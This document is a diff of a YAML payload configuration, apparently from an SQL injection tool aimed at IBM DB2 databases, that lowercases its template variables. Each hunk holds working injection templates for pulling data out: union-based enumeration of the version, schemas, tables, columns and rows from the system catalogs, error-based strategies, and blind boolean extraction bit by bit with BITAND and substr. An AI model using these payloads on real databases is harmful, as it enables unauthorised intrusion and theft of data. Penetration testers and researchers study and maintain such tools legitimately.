@@ -3,53 +3,53 @@ resource:
  info: |
   select 
       versionnumber
-      || '${ENCLOSE_VALUE_SQL}'
+      || '${enclose_value_sql}'
       || current server
-      || '${ENCLOSE_VALUE_SQL}'
+      || '${enclose_value_sql}'
       || user
-      || '${TRAIL_SQL}'
+      || '${trail_sql}'
   from sysibm.sysversions
   
  schema: 
   database: |
    select varchar(
        LISTAGG(
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            || trim(schemaname)
-           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           || '${separator_qte_sql}0${enclose_value_sql}'
        )
-       || '${TRAIL_SQL}'
+       || '${trail_sql}'
    )
    from syscat.schemata
-   {limit}
+   ${limit}
    
   table: |
    select varchar(
        LISTAGG(
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            || trim(name)
-           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           || '${separator_qte_sql}0${enclose_value_sql}'
        )
-       || '${TRAIL_SQL}'
+       || '${trail_sql}'
    )
    from sysibm.systables 
-   where creator = '${DATABASE}'
-   {limit}
+   where creator = '${database}'
+   ${limit}
    
   column: |
    select varchar(
        LISTAGG(
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            || trim(name)
-           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           || '${separator_qte_sql}0${enclose_value_sql}'
        )
-       || '${TRAIL_SQL}'
+       || '${trail_sql}'
    )
    from sysibm.syscolumns
    where coltype != 'BLOB'
-   and tbcreator = '${DATABASE}'
-   and tbname = '${TABLE}'
-   {limit}
+   and tbcreator = '${database}'
+   and tbname = '${table}'
+   ${limit}
    
   row: 
    query: |
@@ -59,23 +59,23 @@ resource:
      */
     select varchar(
         LISTAGG(
-            '${ENCLOSE_VALUE_SQL}'
+            '${enclose_value_sql}'
             || s
-            || '${SEPARATOR_QTE_SQL}1${ENCLOSE_VALUE_SQL}'
+            || '${separator_qte_sql}1${enclose_value_sql}'
         )
-        || '${TRAIL_SQL}'
+        || '${trail_sql}'
     )
     from (
-        select ${FIELDS} s
-        from ${DATABASE}.${TABLE}
-        {limit}
+        select ${fields} s
+        from ${database}.${table}
+        ${limit}
     )
    fields: 
     field: |
      trim(
          coalesce(
              varchar(
-                 ${FIELD} 
+                 ${field} 
                  || ''
              ), 
              ''
@@ -90,24 +90,24 @@ strategy:
        select
            varchar(
                replace(
-                   '${LEAD}'
+                   '${lead}'
                    || substr (
-                       (${INJECTION}),
-                       ${INDEX}
+                       (${injection}),
+                       ${index}
                    ),
-                   '${LEAD}${TRAIL_SQL}',
-                   '${LEAD}'
+                   '${lead}${trail_sql}',
+                   '${lead}'
                )
            )
        from sysibm.sysdummy1
    )
-  limit: limit ${LIMIT}, 5
-  failsafe: varchar('' || (1337${INDICE}7330%2b1), 1024)
+  limit: limit ${limit.value}, 5
+  failsafe: varchar('' || (1337${indice}7330%2b1), 1024)
   calibrator: |
    rpad(
-       '${CALIBRATOR_SQL}', 
+       '${calibrator_sql}', 
        1024, 
-       '${CALIBRATOR_SQL}'
+       '${calibrator_sql}'
    )
   limitBoundary: 0
   endingComment: --+-
@@ -119,13 +119,13 @@ strategy:
     - 'Warning: db2_fetch_array()'
     
  normal: 
-  indices: union select ${INDICES} from sysibm.sysdummy1
+  indices: union select ${indices} from sysibm.sysdummy1
   capacity: |
    /**
     * repeat gets internal table size error on blind 'where 1=1'
     * => uses rpad instead
     */
-   varchar('${LEAD}${INDICE}' || ${CALIBRATOR}, 1024)
+   varchar('${lead}${indice}' || ${calibrator}, 1024)
   orderBy: order by 1337
   
  boolean: 
@@ -149,14 +149,14 @@ strategy:
     0 != BITAND(
         ascii(
             substr(
-                ${INJECTION}, 
-                ${INDEX}, 
+                ${injection}, 
+                ${index}, 
                 1
             )
         ), 
-        ${BIT}
+        ${bit}
     )
-   length: length(${INJECTION}) > ${INDEX}
+   length: length(${injection}) > ${index}
   modeAnd: and
   modeOr: or
-  blind: ${BOOLEAN.MODE} ${TEST}
+  blind: ${boolean.mode} ${test}
